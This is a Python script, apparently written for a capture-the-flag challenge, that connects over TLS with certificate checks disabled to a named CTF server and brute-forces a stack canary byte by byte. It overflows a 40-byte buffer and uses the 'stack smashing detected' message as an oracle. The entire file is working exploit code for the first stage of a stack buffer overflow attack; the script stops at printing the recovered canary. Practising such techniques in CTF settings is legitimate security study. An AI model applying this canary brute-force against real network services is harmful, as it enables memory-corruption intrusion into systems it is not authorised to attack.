import socket
import ssl
import sys
import time

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337
BUF_TO_CANARY = 40

def connect():
    try:
        raw = socket.create_connection((HOST, PORT), timeout=5)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ss = ctx.wrap_socket(raw, server_hostname=HOST)
        return ss
    except Exception as e:
        return None

def recv_until_prompt(s):
    buf = b""
    try:
        s.settimeout(3.0)
        while True:
            chunk = s.recv(1024)
            if not chunk: break
            buf += chunk
            if b"what is your name?" in buf:
                return True
    except TimeoutError:
        pass
    return False

def test_payload(payload):
    s = connect()
    if not s:
        time.sleep(1)
        s = connect()
        if not s: sys.exit(1)
    
    try:
        s.sendall(str(len(payload)).encode() + b"\n")
        if not recv_until_prompt(s):
            s.close()
            return False # Failed to reach payload state
            
        s.sendall(payload)
        
        s.settimeout(2.0)
        buf = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk: break
                buf += chunk
                
                if b"stack smashing detected" in buf:
                    s.close()
                    return False
                if b"Santa is missing" in buf or b"Where do you want to search?" in buf:
                    s.close()
                    return True
            except TimeoutError:
                s.close()
                return True # Alive
            except Exception:
                break
        s.close()
        return False 
    except Exception:
        s.close()
        return False

def brute_force():
    canary = b""
    if not test_payload(b"A" * BUF_TO_CANARY + b"\x00"):
        sys.exit(1)
    canary += b"\x00"

    for i in range(7):
        found_byte = False
        for b in range(256):
            guess = bytes([b])
            if test_payload(b"A" * BUF_TO_CANARY + canary + guess):
                canary += guess
                found_byte = True
                break
        
        if not found_byte:
            sys.exit(1)
            sys.exit(1)
            
    print(f"\nFINAL CANARY: {canary.hex()}")
    return canary

if __name__ == "__main__":
    brute_force()
